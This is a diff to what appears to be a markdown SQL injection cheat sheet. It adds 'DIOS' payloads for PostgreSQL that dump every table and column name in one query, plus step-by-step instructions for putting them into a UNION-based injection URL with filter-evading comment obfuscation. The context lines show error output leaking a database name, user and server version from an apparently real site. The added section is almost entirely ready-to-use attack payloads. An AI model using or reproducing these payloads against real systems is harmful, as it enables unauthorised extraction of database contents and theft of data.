@@ -227,3 +227,28 @@ Retrieving multiple information:
 Inside the error message, the information will be displayed:  
 >Query failed: ERROR: invalid input syntax for integer: **"munivent_database : admin_user : munivent_database : PostgreSQL 9.2.24 on x86_64-redhat-linux-gnu, compiled by gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-39), 64-bit"** in /home/REDACTED/public_html/index.php on line...  
 
+## Retrieve data with DIOS payload
+
+- For Postgre 8.4
+```
+(select+array_to_string(array_agg(concat(table_name,'::',column_name)::text),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))
+```
+- For Postgre 9.1
+```
+(select+string_agg(concat(table_name,'::',column_name),$$%3Cli%3E$$)from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$))
+```
+3. All versions
+```
+(select+array_to_string(array(select+table_name||':::'||column_nam e::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E'))
+```  
+```
+'Makman ::: '||version()||'<br>'||(SELECT array_to_string(array(SELECT ('===>'||table_name||' :: '||column_name)::text FROM information_schema.columns where table_schema='public'),'<br>')) 
+```
+
+### How to use DIOS payload?
+
+Copy the UNION based payload which shows the vulnerable column, in my case this payload worked:  
+```http://domain.com/index.php?id=1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ null,null,null,null```
+
+Because the vulnerable column was **2**, simply replace the second *null* with the DIOS payload:  
+```http://domain.com/index.php?id=1 /*!50000%55nIoN*/ /*!50000%53eLeCt*/ null,(select+array_to_string(array(select+table_name||':::'||column_nam e::text+from+information_schema.columns+where+table_schema+not+in($$information_schema$$,$$pg_catalog$$)),'%3Cli%3E')),null,null```
